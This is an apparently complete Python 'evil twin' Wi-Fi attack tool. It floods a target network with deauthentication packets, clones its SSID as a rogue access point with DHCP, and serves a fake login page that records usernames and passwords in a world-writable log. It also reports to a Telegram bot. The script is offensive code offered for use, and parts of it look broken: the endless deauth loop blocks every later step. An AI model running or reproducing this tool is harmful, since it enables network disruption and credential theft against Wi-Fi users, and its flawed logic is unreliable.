import os
import time
import requests
import telebot
from scapy.all import *

bot_token = input("Enter Telegram Bot Token: ")
chat_id = input("Enter Telegram Chat ID: ")
bot = telebot.TeleBot(bot_token)

class DF_Evil_Twin:
    def __init__(self, interface="wlan0mon"):
        self.interface = interface
        self.ssid = input("Enter Target SSID: ")
        self.bssid = input("Enter Target BSSID: ")

    def send_telegram(self, message):
        for _ in range(8):
            bot.send_message(chat_id, f"آلقيـــــــــــــــآدهہ‌‏ آلزعيـــم\n{message}")

    def deauth_attack(self):
        packet = RadioTap() / Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=self.bssid, addr3=self.bssid) / Dot11Deauth(reason=7)
        while True:
            sendp(packet, iface=self.interface, count=100, inter=0.1, verbose=False)

    def create_fake_ap(self):
        with open("hostapd.conf", "w") as f:
            f.write(f"interface={self.interface}\ndriver=nl80211\nssid={self.ssid}\nchannel=6\n")
        os.system("hostapd hostapd.conf &")

    def setup_dhcp_server(self):
        with open("dnsmasq.conf", "w") as f:
            f.write("interface=" + self.interface + "\ndhcp-range=192.168.1.2,192.168.1.100,12h\n")
        os.system("dnsmasq -C dnsmasq.conf &")

    def enable_ip_forwarding(self):
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

    def start_attack(self):
        self.deauth_attack()
        self.create_fake_ap()
        self.setup_dhcp_server()
        self.enable_ip_forwarding()
        self.send_telegram(f"DF Evil Twin Attack Started on {self.ssid}")

def setup_fake_login(ssid):
    os.system("sudo cp index.html /var/www/html/index.html")
    os.system("sudo cp login.php /var/www/html/login.php")
    os.system(f"echo '<script>window.location.href += \"?ssid={ssid}\";</script>' >> /var/www/html/index.html")
    os.system("sudo chmod 777 /var/www/html/log.txt")
    os.system("sudo service apache2 restart")

def save_to_php(username, ssid, password):
    data = f"Username: {username} | Network: {ssid} | Password: {password}\n"
    with open("data.php", "a") as file:
        file.write(f"<?php\nfile_put_contents('log.txt', '{data}', FILE_APPEND);\n?>")

if __name__ == "__main__":
    print("\n[+] DF Evil Twin Attack Tool by @A_Y_TR\n[+] Channel: https://t.me/cybersecurityTemDF")
    username = input("Enter your username: ")
    attack = DF_Evil_Twin()
    setup_fake_login(attack.ssid)
    save_to_php(username, attack.ssid, "Captured_Password")
    attack.start_attack()
